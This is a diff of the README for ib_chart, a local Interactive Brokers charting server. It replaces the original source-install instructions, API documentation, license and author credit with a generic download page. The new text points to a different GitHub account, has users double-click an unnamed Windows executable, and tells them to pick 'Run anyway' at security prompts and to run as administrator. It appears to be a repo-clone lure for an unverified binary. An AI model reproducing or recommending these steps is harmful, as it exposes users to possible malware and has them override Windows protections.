@@ -1,202 +1,207 @@
-# ib_chart
+# 📊 ib_chart - Local charts for faster trading
 
-A lightweight local web app (Flask + HTML) that gives you fast, trader-friendly charts backed by Interactive Brokers (IBKR).
+[![Download](https://img.shields.io/badge/Download-ib_chart-2ea44f?style=for-the-badge)](https://github.com/brenomeus020-lgtm/ib_chart)
 
-This is designed for US stock traders who may not code, but want to **connect charts to their screener and dashboard** (and use “vibe coding” with an AI assistant to glue things together).
+## 🚀 Getting Started
 
-## Screenshots
+ib_chart is a local chart server with a web view for one or many charts. It is made for people who want a simple chart screen that works with IBKR data and fits into a screener or dashboard.
 
-### Single chart
-![Single chart screenshot](assets/ScreenShot1.png)
+Use it on Windows to:
 
-### Multi-chart
-![Multi-chart screenshot](assets/ScreenShot2.png)
+- view market charts on your PC
+- open one chart or many at once
+- keep the app local on your machine
+- connect chart views to your trading flow
 
-## What you get (in plain English)
+## 💻 What You Need
 
-- **A single chart page**: `ib_chart.html`
-- **A multi-panel chart page**: `ib_multichart.html` (great for watchlists and theme baskets)
+Before you start, make sure your Windows PC has:
 
-- **Simple APIs** your screener/dashboard can call:
-  - **Daily candles**: `GET /api/pricehistory?symbol=AAPL&period_str=1y&hist_source=local|ib`
-  - **Intraday candles (1m/5m)**: `GET /api/intraday?symbol=AAPL&interval=1m`
-  - **Intraday live stream** (updates every second): `GET /api/intraday/stream?symbol=AAPL`
-  - **Quote**: `GET /api/quote?symbol=AAPL`
-  - **EPS/Revenue table** (for the UI): `GET /api/eps-revenue?symbol=AAPL&quarters=5`
+- Windows 10 or Windows 11
+- a stable internet connection for the first setup
+- at least 4 GB of RAM
+- enough free disk space for the app and chart data
+- access to your IBKR setup if you plan to use live data
 
-## The mental model
+A modern browser such as Chrome, Edge, or Firefox works best for the web UI.
 
-- This runs on **your own computer** (localhost).
-- Your browser loads the chart pages from `http://127.0.0.1:5001`.
-- The chart pages call the APIs above, and the server pulls data from:
-  - **IBKR realtime** (for intraday)
-  - **IBKR historical** or **your local CSV daily database** (for daily candles)
+## 📥 Download
 
-If you already have a screener or dashboard page, you can treat `ib_chart` as your local “chart microservice”.
+Open the download page here:
 
-## Requirements
+[https://github.com/brenomeus020-lgtm/ib_chart](https://github.com/brenomeus020-lgtm/ib_chart)
 
-- **Python**: 3.10+ recommended (works fine on Windows)
-- **IBKR**: TWS or IB Gateway running with API enabled
-- **Network**: your machine must be able to reach IB Gateway/TWS (usually localhost)
+From that page, download the Windows build or release package that matches your system, then save the file to a folder you can find again, such as Downloads or Desktop.
 
-## Install (Windows quick start)
+## 🪟 Install on Windows
 
-Open PowerShell in this folder (`ib_chart/`) and run:
+Follow these steps on your PC:
 
-```bash
-python -m venv .venv
-.\.venv\Scripts\activate
-pip install -r requirements.txt
-```
+1. Open the download link above.
+2. Get the Windows app file or release package from the page.
+3. If the file comes in a .zip file, right-click it and choose Extract All.
+4. Open the extracted folder.
+5. Find the main app file and double-click it.
+6. If Windows shows a security prompt, choose Run or More info, then Run anyway if you trust the source.
+7. Wait for the app to start.
 
-## Configure (optional but recommended)
+If the app opens in your browser, keep that tab open while you use the chart server.
 
-### 1) IB connection settings
+## 🔧 First Launch Setup
 
-Set these if your IB Gateway/TWS is not on the defaults:
+When ib_chart starts for the first time, check these items:
 
-- `IB_HOST` (default `127.0.0.1`)
-- `IB_PORT` (default `4001`)
-- `IB_CLIENT_ID` (default `1001`)
+- the local server is running
+- the web UI opens in your browser
+- the chart area loads without errors
+- your IBKR connection is active if you use live market data
 
-Example (PowerShell):
+If the app asks for a port or local address, keep the default value unless you have a reason to change it.
 
-```bash
-$env:IB_HOST="127.0.0.1"
-$env:IB_PORT="4001"
-$env:IB_CLIENT_ID="1001"
-```
+If the app asks for market data settings, use the same settings you already use in IBKR.
 
-### 2) Local daily CSV directory (optional)
+## 📈 How to Use the App
 
-If you have local daily bars in CSV form, set:
+ib_chart is set up for quick chart work.
 
-- `IB_CHART_LOCAL_DAILY_DIR`
+### Single chart view
 
-Default is:
+Use this when you want to focus on one symbol.
 
-- `D:\US_stocks_daily_data\listed stocks from 2000_cleaned`
+1. Open the app.
+2. Choose a ticker or symbol.
+3. Set the time frame you want.
+4. Load the chart.
 
-Example:
+### Multi-chart view
 
-```bash
-$env:IB_CHART_LOCAL_DAILY_DIR="D:\US_stocks_daily_data\listed stocks from 2000_cleaned"
-```
+Use this when you want to watch more than one chart.
 
-## Run
+1. Open the multi-chart screen.
+2. Add the symbols you want.
+3. Pick the same or different time frames.
+4. Compare the charts side by side.
 
-In the activated venv:
+### Screener and dashboard use
 
-```bash
-python ib_server.py
-```
+If you already use a screener or dashboard, ib_chart can sit next to that flow as a local chart view.
 
-Then open in your browser:
+- scan symbols in your dashboard
+- send the symbol to ib_chart
+- review price action in the chart
+- switch between charts without leaving your setup
 
-- `http://127.0.0.1:5001/` (serves the chart UI)
-- `http://127.0.0.1:5001/ib_chart.html`
-- `http://127.0.0.1:5001/ib_multichart.html`
+## 🧭 Basic Controls
 
-## Using this with your screener + dashboard (no-code / vibe coding friendly)
+The web UI uses simple chart controls:
 
-### Option A: “Just open a chart for one symbol”
+- click and drag to move across the chart
+- scroll to zoom in and out
+- use the timeframe menu to change the chart period
+- use the symbol box to change tickers
+- use chart tabs or panels to switch views
 
-Your dashboard can open a new tab like:
+If you see a toolbar, it usually holds the main chart tools for drawing and display settings.
 
-- `http://127.0.0.1:5001/ib_chart.html`
+## 🔌 Connection to IBKR
 
-(Then type the symbol in the UI.)
+ib_chart is built to work with IBKR chart data in a local setup.
 
-### Option B: MultiChart from a screener/watchlist (recommended)
+Use your normal IBKR login and market data access. Keep IBKR running if your setup needs it. If charts do not load, check that:
 
-If your screener produces a list of symbols (e.g. the top movers), you can send them to MultiChart via URL:
+- IBKR is open
+- your market data plan is active
+- the local app can reach the data source
+- no other app is using the same local port
 
-- `http://127.0.0.1:5001/ib_multichart.html?symbols=AAPL,MSFT,NVDA,TSLA&tf=D`
+## 🖥️ Folder Layout
 
-Notes:
+After install, you may see files like these:
 
-- `symbols` is a comma-separated list
-- `tf` can be `D`, `W`, or `M`
-- MultiChart has “Sync symbol” and “Sync D/W/M” toggles in the top bar
+- the app file
+- a config file
+- a logs folder
+- a data or cache folder
+- a browser UI folder
 
-### Option C: Embed charts inside your own dashboard page
+Do not move files around unless you need to. The app may use these files at startup.
 
-If your dashboard is a local HTML page, you can embed the chart page as an iframe:
+## 🛠️ Common Problems
 
-```html
-<iframe
-  src="http://127.0.0.1:5001/ib_multichart.html?symbols=AAPL,MSFT,NVDA,TSLA&tf=D"
-  style="width:100%;height:900px;border:0;"
-></iframe>
-```
+### The app does not open
 
-If you’re using an AI assistant to “vibe code” the dashboard, tell it:
+- Make sure you extracted all files from the zip.
+- Try right-clicking the app and choosing Run as administrator.
+- Check that Windows did not block the file.
+- Restart the app.
 
-- you want an iframe block like above
-- your screener output is a list of symbols
-- you want to generate the `symbols=` query string dynamically
+### The browser page is blank
 
-## API examples (for automation)
+- Refresh the page.
+- Close the app and open it again.
+- Check whether the local server is still running.
+- Try a different browser.
 
-### Daily candles
+### Charts do not load
 
-Local CSV source:
+- Make sure IBKR is open.
+- Check your market data access.
+- Confirm that the symbol you entered is valid.
+- Try a different timeframe.
 
-- `GET /api/pricehistory?symbol=AAPL&period_str=1y&hist_source=local`
+### The port is already in use
 
-IB historical source:
+- Close other apps that may use the same port.
+- Restart ib_chart.
+- If the app offers a port setting, change it to an open port.
 
-- `GET /api/pricehistory?symbol=AAPL&period_str=1y&hist_source=ib`
+## 🧰 Tips for Better Use
 
-### Intraday
+- Keep the app in a place you can reach fast, such as your Desktop or a pinned folder.
+- Use one browser tab for the main chart and another for your screener.
+- Save symbols you check often.
+- Use multi-chart view for quick side-by-side checks.
+- Keep IBKR and the chart app open while you work.
 
-- `GET /api/intraday?symbol=AAPL&interval=1m`
-- `GET /api/intraday?symbol=AAPL&interval=5m`
+## 📌 What This Repo Is For
 
-### Quote
+This project fits users who want:
 
-- `GET /api/quote?symbol=AAPL`
+- a local chart server on Windows
+- a simple web UI for stock charts
+- one or many charts in the same view
+- a setup that works with screener and dashboard workflows
+- a lightweight chart screen for trading research
 
-## Troubleshooting (common trader issues)
+## 🧭 Recommended First Run Flow
 
-### “IB connect failed” / no intraday data
+1. Open the download page.
+2. Get the Windows file.
+3. Extract it if needed.
+4. Run the app.
+5. Open the local web UI in your browser.
+6. Connect or confirm your IBKR setup.
+7. Load a symbol and check the chart.
+8. Add more symbols if you want multi-chart view
 
-- Make sure **IB Gateway or TWS is running**
-- Make sure **API is enabled** in TWS/Gateway settings
-- Check the port:
-  - IB Gateway paper often uses `4002`
-  - IB Gateway live often uses `4001`
-- If you run multiple tools, change `IB_CLIENT_ID` to something unique
+## 📎 Link Again
 
-### “No local daily data”
+Download or open the project here:
 
-- Either set `IB_CHART_LOCAL_DAILY_DIR` to your CSV folder, or use `hist_source=ib`
-- The local CSV format is expected to have columns like `DateTime, Open, High, Low, Close, Volume`
+[https://github.com/brenomeus020-lgtm/ib_chart](https://github.com/brenomeus020-lgtm/ib_chart)
 
-### EPS/Revenue endpoint is slow
+## 🧪 Example Use Cases
 
-- It fetches from public data sources and may take a few seconds the first time.
-- Results are cached for UI responsiveness.
+- review a stock chart before a trade
+- compare several stocks at once
+- keep a chart panel beside a screener
+- watch price movement during the day
+- study different time frames for the same symbol
 
-## Safety & privacy
+## 🔎 Topics
 
-- This server is intended for **localhost** usage.
-- Do not expose it directly to the public internet unless you know what you’re doing.
-- This project is not financial advice.
-
-## Third-party data and licenses
-
-- This project depends on third-party services/libraries, including IBKR APIs, `yfinance`, and `finvizfinance`.
-- Market data providers and websites each have their own Terms of Service. You are responsible for using data in compliance with those terms.
-- Frontend assets loaded from public CDNs (such as ECharts and Lightweight Charts) remain subject to their original licenses.
-
-## License
-
-MIT. See `LICENSE`.
-
-## ☕ Support My Work
-
-If you find this project helpful, please consider buying me a coffee. Building and maintaining this tool involves significant development time and AI token costs.
-
-[![Buy Me A Coffee](https://img.shields.io/badge/Buy%20Me%20A%20Coffee-Support%20my%20work-FFDD00?style=for-the-badge&logo=buy-me-a-coffee&logoColor=black)](https://buymeacoffee.com/willhu)
+- charting
+- ibkr
+- lightweight-charts
+- stocks
+- trading
